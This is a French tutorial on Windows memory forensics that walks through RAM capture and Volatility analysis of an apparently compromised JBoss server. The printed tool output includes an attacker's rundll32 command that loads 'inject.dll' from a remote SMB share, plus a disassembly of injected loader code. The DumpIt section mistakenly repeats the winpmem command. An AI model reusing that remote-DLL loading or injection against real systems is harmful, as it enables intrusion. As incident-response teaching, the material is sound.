@@ -1,0 +1,242 @@
+# Forensic Windows - Mémoire Vive
+
+# 1. Prélévement de la mémoire vive 
+
+Pour chacun des outils ci-dessous, gardez bien à l'esprit que le temps de prélévement dependra toujours de la mémoire vive installé.
+
+## DumpIt
+
+\\
+Il est recommandé lors d'une investigation d'exécuter ce type d'outil à partir d'un périphérique amovible afin de ne pas compromettre la récupération de données sur les périphériques de stockage.
+
+```
+winpmem.exe windows_memory.dmp
+```
+
+
+## Winpmem
+Winpmem est un outil exécuté en ligne de commande.\\
+Il est recommandé lors d'une investigation d'exécuter ce type d'outil à partir d'un périphérique amovible afin de ne pas compromettre la récupération de données sur les périphériques de stockage.
+
+```
+winpmem.exe windows_memory.dmp
+```
+
+
+# 2. Analyse de la mémoire vive
+
+## Volatility
+
+Volatility est un outil opensource dédié à l'analyse de dump mémoire, multi OS.
+Il est ainsi possible d'analyser des dumps mémoire Microsoft Windows / Linux / macOS.
+
+https://github.com/volatilityfoundation/volatility
+
+### kdbgscan - identification du profile
+
+Avant de débuter l'analyse d'un dump de mémoire vive, il est nécessaire de déterminer le profile correspondant à la version de son système d'exploitation.
+
+```
+root@kali# volatility -f ../JbossServer_memory.vmem kdbgscan
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_16299 (6.4.16299 64bit)
+Offset (V)                    : 0xf80378f0d500
+Offset (P)                    : 0x13c50d500
+KdCopyDataBlock (V)           : 0xf80378dede00
+Block encoded                 : Yes
+Wait never                    : 0xaab5d10f40116bba
+Wait always                   : 0x8b5d94baa88a2
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_16299
+Version64                     : 0xf80378f0fcf8 (Major: 15, Minor: 14393)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 14393.693.amd64fre.rs1_release.1
+PsActiveProcessHead           : 0xfffff80378f1c3d0 (87 processes)
+PsLoadedModuleList            : 0xfffff80378f22060 (164 modules)
+KernelBase                    : 0xfffff80378c1d000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff80378f5f000 (CPU 0)
+KPCR                          : 0xffff8380e3158000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win2016x64_14393 (6.4.14393 64bit)
+Offset (V)                    : 0xf80378f0d500
+Offset (P)                    : 0x13c50d500
+KdCopyDataBlock (V)           : 0xf80378dede00
+Block encoded                 : Yes
+Wait never                    : 0xaab5d10f40116bba
+Wait always                   : 0x8b5d94baa88a2
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win2016x64_14393
+Version64                     : 0xf80378f0fcf8 (Major: 15, Minor: 14393)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 14393.693.amd64fre.rs1_release.1
+PsActiveProcessHead           : 0xfffff80378f1c3d0 (87 processes)
+PsLoadedModuleList            : 0xfffff80378f22060 (164 modules)
+KernelBase                    : 0xfffff80378c1d000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff80378f5f000 (CPU 0)
+KPCR                          : 0xffff8380e3158000 (CPU 1)
+
+**************************************************
+```
+
+Pour déterminer le profile adéquat, il est important de comparer la version de compilation "Build string" avec le nom du profile.
+Dans notre cas la version de compilation est la "14393.693.amd64fre.rs1_release.1". Elle correspond à la seconde suggestion de profile "Win2016x64_14393".
+Il y a aussi deux autres critères tout aussi important, le nombre de processus identifiés "PsActiveProcessHead", et "PsLoadedModuleList". Ils doivent avoir un nombre de processus supérieur à 0.
+
+Le temps d'exécution de commande via volatility peut être conséquent en fonction de la mémoire vive disponible sur le serveur (8/16/32G). Le plugin "imageinfo" donne un certain nombre d'informations dont "DTB", et "KDBG" qui peuvent être passées en paramètre. Ces offset permettent de réduire significativement le temps d'exécution des commandes volatility.
+
+```
+root@kali# volatility -f ../JbossServer_memory.vmem  --profile=Win2016x64_14393  imageinfo 
+Volatility Foundation Volatility Framework 2.6
+INFO    : volatility.debug    : Determining profile based on KDBG search...
+          Suggested Profile(s) : Win2016x64_14393
+                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
+                     AS Layer2 : VMWareMetaAddressSpace (Unnamed AS)
+                     AS Layer3 : FileAddressSpace (/media/root/053CD60D397582C6/JbossServer_memory.vmem)
+                      PAE type : No PAE
+                           DTB : 0x1ab000L
+                          KDBG : 0xf80378f0d500L
+          Number of Processors : 2
+     Image Type (Service Pack) : 0
+                KPCR for CPU 0 : 0xfffff80378f5f000L
+                KPCR for CPU 1 : 0xffff8380e3158000L
+             KUSER_SHARED_DATA : 0xfffff78000000000L
+           Image date and time : 2020-01-16 14:01:48 UTC+0000
+     Image local date and time : 2020-01-16 06:01:48 -0800
+```
+
+### Analyse des processus
+
+
+Une des premières action à mener lors d'une investigation numérique est de lister les processus afin d'identifier d'éventuels processus suspects.
+Plusieurs plugins sont disponibles (pslist, pstree, psxview, etc). J'ai une preference pour "pstree" qui organise les processus par lien de parenté.
+
+```
+root@kali# volatility -f ../JbossServer_memory.vmem  --profile=Win2016x64_14393 --kdbg=0xf80378f0d500 --dtb=0x1ab000 pstree
+
+....... 0xffff9a0fd5df2080:java.exe                  4168    996     72      0 2020-01-16 13:22:35 UTC+0000
+........ 0xffff9a0fd5410080:cmd.exe                  5672   4168      1      0 2020-01-16 13:25:03 UTC+0000
+......... 0xffff9a0fd4cf3080:conhost.exe             5680   5672      1      0 2020-01-16 13:25:03 UTC+0000
+......... 0xffff9a0fd5c81080:rundll32.exe            5704   5672      1      0 2020-01-16 13:25:03 UTC+0000
+.......... 0xffff9a0fd5218080:rundll32.exe           5716   5704      2      0 2020-01-16 13:25:03 UTC+0000
+........ 0xffff9a0fd53f1080:cmd.exe                  5812   4168      1      0 2020-01-16 13:25:09 UTC+0000
+......... 0xffff9a0fd6162080:conhost.exe             5820   5812      1      0 2020-01-16 13:25:09 UTC+0000
+......... 0xffff9a0fd4ae7080:rundll32.exe            5844   5812      1      0 2020-01-16 13:25:09 UTC+0000
+.......... 0xffff9a0fd6090080:rundll32.exe           5856   5844      2      0 2020-01-16 13:25:09 UTC+0000
+........ 0xffff9a0fd48bc080:cmd.exe                  5492   4168      1      0 2020-01-16 13:24:57 UTC+0000
+......... 0xffff9a0fd6122800:conhost.exe             5500   5492      1      0 2020-01-16 13:24:57 UTC+0000
+......... 0xffff9a0fd60fc800:rundll32.exe            5524   5492      1      0 2020-01-16 13:24:57 UTC+0000
+........ 0xffff9a0fd5910080:cmd.exe                  6056   4168      1      0 2020-01-16 13:25:15 UTC+0000
+......... 0xffff9a0fd5296080:rundll32.exe            3788   6056      1      0 2020-01-16 13:25:15 UTC+0000
+.......... 0xffff9a0fd528a500:rundll32.exe           3664   3788      2      0 2020-01-16 13:25:15 UTC+0000
+......... 0xffff9a0fd4ac3080:conhost.exe             6032   6056      1      0 2020-01-16 13:25:15 UTC+0000
+```
+
+
+### Dlllist - Analyse des DLLs chargées par les processus
+
+Ce plugin va lister les différentes Dlls qui sont chargées par chacun des processus.
+Il est ainsi possible d'identifier très rapidement une DLL chargée lors d'une intrusion sur un système d'information.
+
+```
+root@kali# volatility -f ../JbossServer_memory.vmem  --profile=Win2016x64_14393 --kdbg=0xf80378f0d500 --dtb=0x1ab000  dlllist 
+Volatility Foundation Volatility Framework 2.6
+************************************************************************
+rundll32.exe pid:   5704
+Command line : rundll32.exe  \\192.168.205.180\XzmKO\inject.dll,0
+
+
+Base                             Size          LoadCount LoadTime                       Path
+------------------ ------------------ ------------------ ------------------------------ ----
+0x0000000000a00000            0x14000             0xffff 2020-01-16 13:25:03 UTC+0000   C:\Windows\SysWOW64\rundll32.exe
+0x00007ffc38d20000           0x1d1000             0xffff 2020-01-16 13:25:03 UTC+0000   C:\Windows\SYSTEM32\ntdll.dll
+0x0000000055ae0000            0x52000             0xffff 2020-01-16 13:25:03 UTC+0000   C:\Windows\System32\wow64.dll
+0x0000000055b40000            0x77000                0x6 2020-01-16 13:25:03 UTC+0000   C:\Windows\System32\wow64win.dll
+..
+0x00000000738e0000             0x5000                0x6 2020-01-16 13:25:03 UTC+0000   \\192.168.205.180\XzmKO\inject.dll
+```
+
+
+
+
+### Malfind - Injection de code
+
+```
+root@kali# volatility -f ../JbossServer_memory.vmem  --profile=Win2016x64_14393 --kdbg=0xf80378f0d500 --dtb=0x1ab000 malfind -p 5716
+..
+Process: rundll32.exe Pid: 5716 Address: 0x850000
+Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
+Flags: PrivateMemory: 1, Protection: 6
+
+0x00850000  4d 5a e8 00 00 00 00 5b 52 45 55 89 e5 81 c3 64   MZ.....[REU....d
+0x00850010  13 00 00 ff d3 81 c3 95 a8 02 00 89 3b 53 6a 04   ............;Sj.
+0x00850020  50 ff d0 00 00 00 00 00 00 00 00 00 00 00 00 00   P...............
+0x00850030  00 00 00 00 00 00 00 00 00 00 00 00 f8 00 00 00   ................
+
+0x00850000 4d               DEC EBP
+0x00850001 5a               POP EDX
+0x00850002 e800000000       CALL 0x850007
+0x00850007 5b               POP EBX
+0x00850008 52               PUSH EDX
+0x00850009 45               INC EBP
+0x0085000a 55               PUSH EBP
+0x0085000b 89e5             MOV EBP, ESP
+0x0085000d 81c364130000     ADD EBX, 0x1364
+0x00850013 ffd3             CALL EBX
+0x00850015 81c395a80200     ADD EBX, 0x2a895
+0x0085001b 893b             MOV [EBX], EDI
+0x0085001d 53               PUSH EBX
+0x0085001e 6a04             PUSH 0x4
+0x00850020 50               PUSH EAX
+0x00850021 ffd0             CALL EAX
+0x00850023 0000             ADD [EAX], AL
+0x00850025 0000             ADD [EAX], AL
+0x00850027 0000             ADD [EAX], AL
+0x00850029 0000             ADD [EAX], AL
+0x0085002b 0000             ADD [EAX], AL
+0x0085002d 0000             ADD [EAX], AL
+0x0085002f 0000             ADD [EAX], AL
+0x00850031 0000             ADD [EAX], AL
+0x00850033 0000             ADD [EAX], AL
+0x00850035 0000             ADD [EAX], AL
+0x00850037 0000             ADD [EAX], AL
+0x00850039 0000             ADD [EAX], AL
+0x0085003b 00f8             ADD AL, BH
+0x0085003d 0000             ADD [EAX], AL
+0x0085003f 00               DB 0x0
+```
+
+Le plugin malfind a identifié un certain nombre d'anomalie au sein du processus. Nous avons donc décidé d'extraire ces sections de mémoires afin de les analyser plus en détail.
+
+```
+root@kali# volatility -f ../JbossServer_memory.vmem  --profile=Win2016x64_14393 --kdbg=0xf80378f0d500 --dtb=0x1ab000 malfind -p 5716 -D ./malfind_dump/
+
+root@kali# ll malfind_dump/
+-rwxrwxrwx 1 root root 401407 Feb  1 04:56  process.0xffff9a0fd5218080.0x4670000.dmp
+-rwxrwxrwx 1 root root   4095 Feb  1 04:56  process.0xffff9a0fd5218080.0x680000.dmp
+-rwxrwxrwx 1 root root 184319 Feb  1 04:56  process.0xffff9a0fd5218080.0x850000.dmp
+-rwxrwxrwx 1 root root 204799 Feb  1 04:56  process.0xffff9a0fd5218080.0x880000.dmp
+-rwxrwxrwx 1 root root 135167 Feb  1 04:56  process.0xffff9a0fd5218080.0x9c0000.dmp
+```
+
+Grâce à la commande "file", il a été facile d'identifier les sections contenant un PE "Executable Windows".
+
+```
+root@kali# for i in $(ls ./malfind_dump/*.dmp); do echo $(file $i); done
+process.0xffff9a0fd5218080.0x4670000.dmp: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
+process.0xffff9a0fd5218080.0x680000.dmp: data
+process.0xffff9a0fd5218080.0x850000.dmp: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
+process.0xffff9a0fd5218080.0x880000.dmp: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
+process.0xffff9a0fd5218080.0x9c0000.dmp: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
+```
+
+Ensuite, nous pouvons les uploader sur la plateforme "Virustotal" afin d'obtenir une analyse antivirale.
+
+{{ :forensic:volatility_malfind_virustotal.png?nolink |}}
+
+
